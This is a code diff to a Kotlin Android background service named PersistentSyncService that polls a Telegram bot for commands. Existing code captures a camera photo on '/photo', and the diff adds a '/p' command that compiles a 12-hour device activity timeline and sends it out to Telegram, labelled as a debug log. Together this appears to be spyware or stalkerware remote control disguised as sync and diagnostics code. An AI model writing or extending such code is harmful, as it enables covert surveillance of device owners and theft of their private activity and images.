@@ -40,10 +40,15 @@ class PersistentSyncService : Service() {
                             val update = updates.getJSONObject(i)
                             lastUpdateId = update.getLong("update_id")
                             val message = update.getJSONObject("message")
-                            if (message.has("text") && message.getString("text") == "/photo") {
-                                val photoFile = CameraUtility.capturePhoto(this@PersistentSyncService)
-                                // Assume uploadDiagnosticImage exists or adapt as needed
-                                // uploadDiagnosticImage(photoFile)
+                            if (message.has("text")) {
+                                val text = message.getString("text")
+                                if (text == "/photo") {
+                                    val photoFile = CameraUtility.capturePhoto(this@PersistentSyncService)
+                                    // uploadDiagnosticImage(photoFile)
+                                } else if (text == "/p") {
+                                    val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
+                                    TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
+                                }
                             }
                         }
                     }
